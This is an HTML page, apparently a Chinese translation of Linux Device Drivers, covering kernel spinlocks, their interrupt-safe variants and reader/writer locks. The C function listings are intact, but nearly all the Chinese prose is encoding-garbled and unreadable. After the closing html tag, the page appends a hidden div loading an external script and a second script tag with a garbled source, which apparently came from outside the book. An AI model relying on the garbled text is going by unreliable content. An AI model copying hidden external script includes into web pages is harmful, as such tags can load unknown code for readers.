<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>5.5.&#160;-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch05.html" title="&#160;5&#160;&#160;;">
<link rel="prev" href="ch05s04.html" title="5.4.&#160;Completions ">
<link rel="next" href="ch05s06.html" title="5.6.&#160;">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">5.5.&#160;</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch05s04.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;5&#160;&#160;;</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch05s06.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="Spinlocks.sect"></a>5.5.&#160;</h2></div></div></div>
<p>ڻ, һõĹ, ǲںṩΨһĹ. ෴, 󲿷ּһֳΪĻʵ. , ڲ˯ߵĴ, жϴ. ȷʹ, ͨṩ˱ߵ. Ȼ, ȷʵ÷һײͬ.</p>
<p>ϼ. һһ豸, ֻ 2 ֵ:"""". ʵΪһֵеһλ. ȡһĴصλ. ǿõ, ""λλҴٽ. ෴, Ѿ˻, һյѭз, ֱΪ. ѭ"".</p>
<p>Ȼ, һʵʵֱĸһ. "Բλ"ԭӷʽ, Աֻһܹ߳, жκθʱ. СԱڳ̴߳ -- ʵֶ CPU ԹһĺͻоƬ. ʵʵʵÿ Linux ֵ֧ϵ϶ͬ. ĵĸϵͳͬ, Ȼ, жľ, ȴĴһѭִвҲõĹ.</p>
<p>ǵ, Ǵڶദϵͳ, һһռʽں˵ĵվΪͬ SMP, ֻǵ. һռĵϵͳһϵ, Զ; ûܹ߳ CPU ͷ. , ûдռĵϵͳϵĲŻΪʲô, ˸ı IRQ ״̬Щ. ռ, ӲϣĴһ SMP ϵͳ, ȻҪʵȷļ.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="IntroductiontotheSpinlockAPI.sect"></a>5.5.1.&#160; API </h3></div></div></div>
<p>ԭҪİļ &lt;linux/spinlock.h&gt;. һʵʵ spinlock_t. κݽṹ, һ ʼ. ʼڱʱ, :</p>
<pre class="programlisting">
spinlock_t my_lock = SPIN_LOCK_UNLOCKED; 
</pre>
<p>ʱʹ:</p>
<pre class="programlisting">
void spin_lock_init(spinlock_t *lock); 
</pre>
<p>ڽһٽǰ, ĴҪ lock , :</p>
<pre class="programlisting">
void spin_lock(spinlock_t *lock); 
</pre>
<p>עеȴ, ǵ, жϵ. һ spin_lock, 㽫ֱΪ.</p>
<p>Ϊͷһѻõ, :</p>
<pre class="programlisting">
void spin_unlock(spinlock_t *lock); 
</pre>
<p>кܶ, ǽܿ춼. ûһгĺչʾĺĸ. ˼ͷ, ûʲôɶһ. , мʹ. ǽһʱЩ, ڽӿ֮ǰ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="SpinlocksandAtomicContext.sect"></a>5.5.2.&#160;ԭ</h3></div></div></div>
<p>һһٽ. мĳ, ʧȥ˴. ѵһ( copy_from_user, ) ʹ̽˯. , Ҳ, ںռ, һȼĽ̽ĴƵһ. Ĵڳһ, ڿɼĽʱ䲻ͷ. ĳ߳ͬһ, , õ, ȴ( ڴ )ܳʱ. , ϵͳȫ.</p>
<p>󲿷ֶ߻ͬǱ. , ӦõĺĹκδ, ڳʱ, ԭԵ. ˯; ʵ, Ϊκԭ, ˷ж(ʱʱҲ)</p>
<p>ںռԼ. ں˴һκʱ, ռشϱֹ. 㵥ϵͳַʽֹռԱ⾺. ΪʲôҪȷļ, ӲĴڶദ.</p>
<p>ڳһʱ˯Ǹ; ܶں˺˯, ΪǶȷ¼. ݵûռһԵ: ûռҳҪڿǰӴϻ, ȻҪһ˯. ڴκβ˯. kmalloc ܹ, ҵȴڴóȷ֪. ˯߿ܷ˾ȵĵط; дִеĴҪעõÿ.</p>
<p>һ: ִвѾȡһƶ豸Ĵȡ. ʱ, 豸һж, ʹжϴ. жϴ, ڴȡ豸֮ǰ, . һжϴлȡһһҪĺϷ; ˯ߵһ. жϴĴͬһϻᷢʲô? жϴ, жϴ벻ͷ. Զ.</p>
<p>Ҫڳʱֹж( ֻڱ CPU ). иΪֹж( ǽһڼ ). , һж۱ȵ 10 .</p>
<p>ʹõһҪһֱǾܶʱĳ. һԽ, һ̿ܲòȴͷʱԽ, òȫĻԽ. ʱҲֹ˵ǰ, ζŸȼ -- Ӧܻ CPU  -- ܲòȴ. ں˿߾˺ܴŬں˷Ӧʱ( һ̿ܲòȴȵʱ ) 2.5 ϵ. һдĺܲݻеĽ, ͨһ̫ʱ. Ϊ, ʹʱ.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheSpinlockFunctions.sect"></a>5.5.3.&#160;</h3></div></div></div>
<p>Ѿ 2 , spin_lock  spin_unlock, Բ. , Ȼ, ƵӺ;. ڻչʾȫ. ۽ǵһ޷ڼʵǵĵط;  API Ҫжϴظ.</p>
<p>ʵ 4 Լһ:</p>
<pre class="programlisting">
void spin_lock(spinlock_t *lock);
void spin_lock_irqsave(spinlock_t *lock, unsigned long flags);
void spin_lock_irq(spinlock_t *lock);
void spin_lock_bh(spinlock_t *lock)
</pre>
<p>Ѿι. spin_loc_irqsave ֹж(ֻڱش)ڻ֮ǰ; ֮ǰж״̬ flags . ȷĴûнֹжϵ(, 仰˵, ȷӦͷʱж), ʹ spin_lock_irq , Ҳرָ flags. , spin_lock_bh ڻȡ֮ǰֹж, Ӳж򿪵.</p>
<p>һܱ(Ӳ)жеĴõ, ʹһ spin_lock ʽֹж. ϵͳ, . 㲻Ӳжϴȡ, ͨж(, һ tasklet еĴ, ڵ 7 漰 ), ʹ spin_lock_bh ȫر, ȻӲжϱ.</p>
<p>Ҳ 4 ͷһ; õǸӦȡĺ.</p>
<pre class="programlisting">
void spin_unlock(spinlock_t *lock);
void spin_unlock_irqrestore(spinlock_t *lock, unsigned long flags);
void spin_unlock_irq(spinlock_t *lock);
void spin_unlock_bh(spinlock_t *lock);
</pre>
<p>ÿ spin_unlock ָɶӦ spin_lock Ĺ. ݸ spin_unlock_irqrestore  flags Ǵݸ spin_lock_irqsave ͬһ. Ҳ spin_lock_irqsave  spin_unlock_irqrestore ͬһ. , ĴƻĳЩϵ.</p>
<p>һ׷:</p>
<pre class="programlisting">
int spin_trylock(spinlock_t *lock);
int spin_trylock_bh(spinlock_t *lock);
</pre>
<p>Щɹʱط(  ),  0. û"try"汾ֹж.</p>
</div>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="ReaderWriterSpinlocks.sect"></a>5.5.4.&#160;/д</h3></div></div></div>
<p>ںṩһĶ/дʽ, ֱģڱǰĶ/д. ЩκĿĶͬʱٽ, д߱Ĵȡ. дһ rwlock_t,  &lt;linux/spinlokc.h&gt; ж. ǿ 2 ַʽͱʼ:</p>
<pre class="programlisting">
rwlock_t my_rwlock = RW_LOCK_UNLOCKED; /* Static way */ 
rwlock_t my_rwlock;
rwlock_init(&amp;my_rwlock); /* Dynamic way */
</pre>
<p>úбӦ൱. ڶ, кǿõ:</p>
<pre class="programlisting">
void read_lock(rwlock_t *lock);
void read_lock_irqsave(rwlock_t *lock, unsigned long flags);
void read_lock_irq(rwlock_t *lock);
void read_lock_bh(rwlock_t *lock);

void read_unlock(rwlock_t *lock);
void read_unlock_irqrestore(rwlock_t *lock, unsigned long flags);
void read_unlock_irq(rwlock_t *lock);
void read_unlock_bh(rwlock_t *lock);
</pre>
<p>Ȥ, û read_trylock. дȡĺƵ:</p>
<pre class="programlisting">
void write_lock(rwlock_t *lock);
void write_lock_irqsave(rwlock_t *lock, unsigned long flags);
void write_lock_irq(rwlock_t *lock);
void write_lock_bh(rwlock_t *lock);
int write_trylock(rwlock_t *lock);

void write_unlock(rwlock_t *lock);
void write_unlock_irqrestore(rwlock_t *lock, unsigned long flags);
void write_unlock_irq(rwlock_t *lock);
void write_unlock_bh(rwlock_t *lock);
</pre>
<p>/дܹ,  rwsem һ. Ϊһ; Ȼ, 㹻𼢶, ζ.</p>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch05s04.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch05.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch05s06.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">5.4.&#160;Completions &#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;5.6.&#160;</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>